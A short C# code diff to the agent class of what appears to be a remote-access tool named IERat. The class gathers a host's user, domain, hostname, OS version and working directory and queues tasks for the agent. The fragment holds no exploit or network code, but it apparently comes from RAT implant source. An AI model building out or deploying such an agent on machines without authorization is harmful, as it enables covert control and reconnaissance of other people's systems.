@@ -17,16 +17,18 @@ namespace IERat
             Username = Environment.UserName;
             Domain = Environment.UserDomainName;
             Hostname = Environment.MachineName;
-            OSVersion = Environment.OSVersion.VersionString;
+            OSVersion = Environment.OSVersion.Version.ToString();
             AgentTasks = new Queue<TaskObject>();
             CompletedAgentTasks = new Queue<TaskObject>();
-            Version = "0.1";
+            Version = "free";
+            Cwd = Directory.GetCurrentDirectory();
         }
         public Guid ID { get; set; }
         public string Username { get; set; }
         public string Domain { get; set; }
         public string Hostname { get; set; }
         public string OSVersion { get; set; }
+        public string Cwd { get; set; }
         public string Version { get; set; }
         public Queue<TaskObject> AgentTasks { get; set; }
         public Queue<TaskObject> CompletedAgentTasks { get; set; }
